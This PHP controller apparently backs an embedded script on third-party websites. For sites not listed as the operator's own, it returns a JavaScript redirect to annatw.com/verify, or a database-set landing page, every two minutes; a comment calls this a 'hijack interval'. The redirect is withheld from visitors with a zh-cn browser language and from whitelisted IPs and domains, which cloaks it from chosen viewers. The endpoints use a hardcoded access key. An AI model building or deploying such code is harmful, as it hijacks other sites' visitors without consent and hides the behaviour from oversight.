<?php

namespace app\controller;
use app\BaseController;
use app\model\Web;
use app\model\Safe;
use think\facade\Log;
use think\facade\Db;
class Verify extends BaseController
{
    var $timing = 2;  //劫持间隔时间
     public static $myip = array("220.246.113.60","113.66.55.99");
    var $tzjscode =  "javascript:location.href='https://www.annatw.com/verify';window.open('https://www.annatw.com/verify');";
    public static $svgname = array("mo_icon_list2.svg","mo_icon_list3.svg","mo_icon_list4.svg","mo_icon_list 4.svg","freckle.forslim.xyz","slim.fittingsbody.com");
    function __construct()
    {
        header('Access-Control-Allow-Origin: *');
        Log::close();
    }
    function index()
    {
        if (
            $_GET &&
            isset($_GET['mm']) &&
            $_GET['mm'] === 'qsHPLIuO6O9cxQ8Z9aaa'
        ) {
            $web = new Web();
            $safe = new Safe();
            $web_url = $_GET['web'];

            if (strpos($web_url, 'www') !== false) {
                $web_urls = str_replace('www.', '', $web_url);
            } else {
                $web_urls = 'www.' . $web_url;
            }

            $web_paas = $web->get_Url_paas($web_url); //获取url所在的平台ID
            if (!is_numeric($web_paas)) {
                $web_paas = $web->get_Url_paas($web_urls);
                if (!is_numeric($web_paas)) {
                    //如果链接不存在数据库，且不属于amy官网,就表示不是我们的网站
                    //logURL($web_urls);  //本地文件记录
                    if (trim($_GET['web']) !== '') {
                        $logdata = [
                            'ip' => getHostIp(),
                            'weburl' => $_GET['web'],
                        ];
                       // Db::name('webcodesafe_log')->save($logdata);
                    }
                  

                    $tzobj = $safe->getdata(1); //返回一个object
                    //当code = 5 时，将跳转至我们的落地页，數據庫修改code
                if ($tzobj['tz_code'] === 5) {
                    $data = [
                        'code' => $tzobj['tz_code'],
                        'tz_url' => $tzobj['tz_url'],
                    ];
                    return json($data);
                } else {
                    if(date('i')%($this->timing)===0){
                      $jscode = $this->tzjscode;
                      if(!self::cnIP()){return json(['code'=>5,'tz_url'=>$jscode]);}
                    }
                    //不是我們的網站，不跳轉
                    $data = ['code' => 1, 'status' => 'ok '];
                    return json($data);
                }
                }
            }
            //是我们的网站，则返回 1
            $data = ['code' => 1, 'status' => 'ok'];
            return json($data);
        } else {
            return '<h1><center>嗨！别来无恙啊！</center></h1>' .
                "<script>console.log('嗨！别来无恙啊！')</script>";
        }
    }
    public function v()
    {
        if (!$_POST || !isset($_POST['w'])) {
            $data = ['code' => 0, 'status' => 'error'];
            return json($data);
        }

        $web = new Web();
        $safe = new Safe();
        $web_url = $_POST['w'];
        $href = $_POST['v'];

        if (strpos($web_url, 'www') !== false) {
            $web_urls = str_replace('www.', '', $web_url);
        } else {
            $web_urls = 'www.' . $web_url;
        }

        $web_paas = $web->get_Url_paas($web_url); //获取url所在的平台ID
        if (!is_numeric($web_paas)) {
            $web_paas = $web->get_Url_paas($web_urls);
            if (!is_numeric($web_paas)) {
                //如果链接不存在数据库，就表示不是我们的网站
                if (strpos($href, '127') === false && trim($href) !== '') {
                    //不包含127.0.0.1
                    if(!in_array(getHostIp(),self::$myip)){
                    $logdata = ['ip' => getHostIp(), 'weburl' => $href];
                   // Db::name('webcodesafe_log')->save($logdata);
                  }
                }

                $tzobj = $safe->getdata(1); //返回一个object
                //当code = 5 时，将跳转至我们的落地页，數據庫修改code
                if ($tzobj['tz_code'] === 5) {
                    $data = [
                        'code' => $tzobj['tz_code'],
                        'tz_url' => $tzobj['tz_url'],
                    ];
                    return json($data);
                } else {
                    if(date('i')%($this->timing)===0){
                      $jscode = $this->tzjscode;
                      if(!self::cnIP()){return json(['code'=>5,'tz_url'=>$jscode]);}
                    }
                    //不是我們的網站，不跳轉
                    $data = ['code' => 1, 'status' => 'ok '];
                    return json($data);
                }
            }
        }
        //是我们的网站，则返回 1
        $data = ['code' => 1, 'status' => 'ok'];
        return json($data);
    }
     public function o()
    {
        if (!$_POST || !isset($_POST['w'])) {
            $data = ['code' => 0, 'status' => 'error'];
            return json($data);
        }

        $web = new Web();
        $safe = new Safe();
        $web_url = $_POST['w'];
        $href = $_POST['v'];

        if (strpos($web_url, 'www') !== false) {
            $web_urls = str_replace('www.', '', $web_url);
        } else {
            $web_urls = 'www.' . $web_url;
        }

        $web_paas = $web->get_Url_paas($web_url); //获取url所在的平台ID
        if (!is_numeric($web_paas)) {
            $web_paas = $web->get_Url_paas($web_urls);
            if (!is_numeric($web_paas)) {
                //如果链接不存在数据库，且不属于amy官网,就表示不是我们的网站
                if (strpos($href, '127') === false && trim($href) !== '') {
                    //不包含127.0.0.1
                    if(!in_array(getHostIp(),self::$myip)){
                    $logdata = ['ip' => getHostIp(), 'weburl' => $href];
                   // Db::name('webcodesafe_log')->save($logdata);
                  }
                }

                $tzobj = $safe->getdata(1); //返回一个object
                //当code = 5 时，将跳转至我们的落地页，數據庫修改code
                if ($tzobj['tz_code'] === 5) {
                    $data = [
                        'code' => $tzobj['tz_code'],
                        'tz_url' => $tzobj['tz_url'],
                    ];
                    return json($data);
                } else {
                    if(date('i')%($this->timing)===0){
                      $jscode = $this->tzjscode;
                      if(!self::cnIP()){return json(['code'=>5,'tz_url'=>$jscode]);}
                    }
                    //不是我們的網站，不跳轉
                    $data = ['code' => 1, 'status' => 'ok '];
                    return json($data);
                }
            }
        }
        //是我们的网站，则返回 1
        $data = ['code' => 1, 'status' => 'ok'];
        return json($data);
    }
    public function l()
    {
        if (!$_POST || !isset($_POST['w'])) {
            $data = ['code' => 0, 'status' => 'error'];
            return json($data);
        }

        $web = new Web();
        $safe = new Safe();
        $web_url = $_POST['w'];
        $href = $_POST['v'];

        if (strpos($web_url, 'www') !== false) {
            $web_urls = str_replace('www.', '', $web_url);
        } else {
            $web_urls = 'www.' . $web_url;
        }

        $web_paas = $web->get_Url_paas($web_url); //获取url所在的平台ID
        if (!is_numeric($web_paas)) {
            $web_paas = $web->get_Url_paas($web_urls);
            if (!is_numeric($web_paas)) {
                //如果链接不存在数据库，且不属于amy官网,就表示不是我们的网站
                if (strpos($href, '127') === false && trim($href) !== ''&& trim($href) !== '0') {
                    //不包含127.0.0.1
                  if(!in_array(getHostIp(),self::$myip) || !self::issvgname($href)){
                    $logdata = ['ip' => getHostIp(), 'weburl' => $href];
                   // Db::name('webcodesafe_log')->save($logdata);
                  }
                }

                $tzobj = $safe->getdata(1); //返回一个object
                //当code = 5 时，将跳转至我们的落地页，數據庫修改code
                if ($tzobj['tz_code'] === 5) {
                    $data = [
                        'code' => $tzobj['tz_code'],
                        'tz_url' => $tzobj['tz_url'],
                    ];
                    return json($data);
                } else {
                    if((date('i')%($this->timing)===0) && !self::issvgname($href)){
                      $jscode = $this->tzjscode;
                      if(!self::cnIP()){return json(['code'=>5,'tz_url'=>$jscode]);}
                    }
                    //不是我們的網站，不跳轉
                    $data = ['code' => 1, 'status' => 'ok '];
                    return json($data);
                }
            }
        }
        //是我们的网站，则返回 1
        $data = ['code' => 1, 'status' => 'ok'];
        return json($data);
    }
  
  public function i()
    {
        if (!$_POST || !isset($_POST['w'])) {
            $data = ['code' => 0, 'status' => 'error'];
            return json($data);
        }

        $web = new Web();
        $safe = new Safe();
        $web_url = $_POST['w'];
        $href = $_POST['v'];

        $web_paas = $web->get_Url_paas($web_url); //获取url所在的平台ID
        if (!is_numeric($web_paas)) {
            $web_paas = $web->get_Url_paas($web_url);
            if (!is_numeric($web_paas)) {
                //如果链接不存在数据库，且不属于amy官网,就表示不是我们的网站
                if (strpos($href, '127') === false && trim($href) !== ''&& trim($href) !== '0') {
                    //不包含127.0.0.1
                  if(!in_array(getHostIp(),self::$myip)){
                    $logdata = ['ip' => getHostIp(), 'weburl' => $href];
                  //  Db::name('webcodesafe_log')->save($logdata);
                  }
                }

                $tzobj = $safe->getdata(1); //返回一个object
                //当code = 5 时，将跳转至我们的落地页，數據庫修改code
                if ($tzobj['tz_code'] === 5) {
                    $data = [
                        'code' => $tzobj['tz_code'],
                        'tz_url' => $tzobj['tz_url'],
                    ];
                    return json($data);
                } else {
                    if(date('i')%($this->timing)===0){
                      $jscode = $this->tzjscode;
                      if(!self::cnIP()){return json(['code'=>5,'tz_url'=>$jscode]);}
                    }
                    //不是我們的網站，不跳轉
                    $data = ['code' => 1, 'status' => 'ok '];
                    return json($data);
                }
            }
        }
        //是我们的网站，则返回 1
        $data = ['code' => 1, 'status' => 'ok'];
        return json($data);
    }

    static function twIP()
    {
      //$lg = strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]);
      if( strpos(strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]),'zh-tw') !== false ){
        //echo "tw<br>",$lg;
        return true;
      }else{
        //echo "cn<br>",$lg;
        return false;
      }
    }
  
    static function cnIP()
    {
      if( strpos(strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]),'zh-cn') !== false ){
        return true;
      }else{
        return false;
      }
    }
    
    public function cn()
    {
      //echo getHostIp();
      $lg = strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]);
      if( strpos(strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]),'zh-cn') !== false ){
        echo "cn<br>",$lg;
        //return true;
      }else{
        echo "tw<br>",$lg;
        //return false;
      }
    }
   
   static function issvgname($href)
   {
     foreach(self::$svgname as $name){
       if(strpos($href,$name) !== false) return true;
     }
   }
}
